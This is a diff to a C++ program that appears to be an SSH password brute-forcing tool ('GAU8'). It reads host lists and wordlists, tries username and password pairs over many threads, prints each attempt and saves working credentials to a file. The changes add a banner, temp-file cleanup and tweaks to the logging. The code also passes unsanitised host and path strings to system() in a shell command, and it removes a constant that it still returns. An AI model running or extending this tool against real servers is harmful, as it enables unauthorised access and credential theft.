@@ -7,6 +7,8 @@
 #include <vector>
 #include <chrono>
 #include <cstring>
+#include <signal.h>
+#include <stdlib.h>
 
 //   /$$$$$$$  /$$$$$$$$ /$$      /$$       /$$$$$$       /$$   /$$  /$$$$$$  /$$$$$$$$        /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$
 //  | $$__  $$|__  $$__/| $$  /$ | $$      |_  $$_/      | $$  | $$ /$$__  $$| $$_____/       /$$__  $$| $$__  $$ /$$__  $$| $$  | $$
@@ -19,14 +21,17 @@
 
 //bruh
 
-
-#define LINNUX_COMMAND_ERR 128
-
-
 int main(int argc, char** argv)
 {
     system("clear");
-    fprintf(stdout,"GAU8....\n\n");
+std::cout << "\n\n"
+          << "      ▒▓█  ▒▓██████▓▒   ▒▓██████▓▒  ▒▓█▓▒  ▒▓█▓▒         ▒▓██████▓▒  █▓▒\n"
+          << "     ▒▓█  ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒        ▒▓█▓▒  ▒▓█▓▒  █▓▒\n"
+          << "    ▒▓█   ▒▓█▓▒        ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒        ▒▓█▓▒  ▒▓█▓▒   █▓▒\n"
+          << "   ▒▓█    ▒▓█▓▒▒▓███▓▒ ▒▓████████▓▒ ▒▓█▓▒  ▒▓█▓▒ ▓████▓  ▒▓██████▓▒     █▓▒\n"
+          << "  ▒▓█     ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒        ▒▓█▓▒  ▒▓█▓▒     █▓▒\n"
+          << " ▒▓█      ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒ ▒▓█▓▒  ▒▓█▓▒        ▒▓█▓▒  ▒▓█▓▒      █▓▒\n"
+          << "▒▓█        ▒▓██████▓▒  ▒▓█▓▒  ▒▓█▓▒  ▒▓██████▓▒          ▒▓██████▓▒        █▓▒\n\n" << std::endl;
 
     //User license
 
@@ -38,7 +43,7 @@ int main(int argc, char** argv)
     std::vector<std::thread*> threads;
     std::mutex m_lock_pass;
     std::ifstream hosts_file;
-    std::ofstream found_combos;
+    std::fstream found_combos;
     const char* user = nullptr;
     long long attempt_counter = 0;
 
@@ -86,7 +91,7 @@ int main(int argc, char** argv)
             
         }else if(!strcmp(argv[i], "-o") || !strcmp(argv[i], "--output"))
         {
-            found_combos.open(argv[++i]);
+            found_combos.open(argv[++i], std::ios::out);
         }
     }
 
@@ -106,12 +111,16 @@ int main(int argc, char** argv)
         return LINNUX_COMMAND_ERR;
     }
 
+    //Clean all temp files created for each host from /tmp
+    signal(SIGINT, clean_temp_files);
+
 
     for(uint16_t host_index = 0; host_index < hosts.size(); ++host_index)
     {
 
         system(std::string("cat " + wordlist_path + " > /tmp/gau8_tmp_wordlist_" + hosts[host_index]).c_str());
         wordlist_for_host.push_back(new std::ifstream(std::string("/tmp/gau8_tmp_wordlist_" + hosts[host_index]).c_str()));
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
         for(uint16_t i = 1; i <= num_of_threads_per_host; i++)
         {
             //add all threads to the vector of threads 
@@ -141,25 +150,27 @@ int main(int argc, char** argv)
                             attempt_counter++;
                             m_lock_pass.unlock();
                         }
-    
-                        //try to authenticate via the username that the connection was created with and the password that was read above
+                            
                         
-                        std::string result_from_auth = "ATTEMPT: ";
-
+                        
+                        //try to authenticate via the username that the connection was created with and the password that was read above
+                        std::string result_from_auth = "ATTEMPT: " + std::to_string(attempt_counter) + " - Auth for user " + user + ":" + f_password + " for host " + host;
                         if(f_ssh->auth_user_pass(user, f_password))
                         {                
                             //print the successful attempt
-                            result_from_auth = result_from_auth + std::to_string(attempt_counter) + " - Auth successful for user " + user + ":" + f_password + "\n\n\n\n";
-                            found_combos << user << ":" << f_password << " " << host << "\n";
+                            result_from_auth += " - SUCCESS\n";
+                            found_combos << user << ":" << f_password << " " << host << std::endl;
                         }else
                         {
                             //print the unsuccessful attempt
-                            result_from_auth = result_from_auth + std::to_string(attempt_counter) + " - Auth failed for user " + user + ":" + f_password + " for host " + host;
+                            result_from_auth += " - FAILURE";
                         }
 
+                        //Print the result with CR 
                         print_term_size_cr(result_from_auth);
-                        //std::cout << result_from_auth;
+
                     }
+                    //Disconnect after attempts_per_conn attempts (I suggest to let attempts_per_conn=3 )
                     delete f_ssh;
                 }
             }));
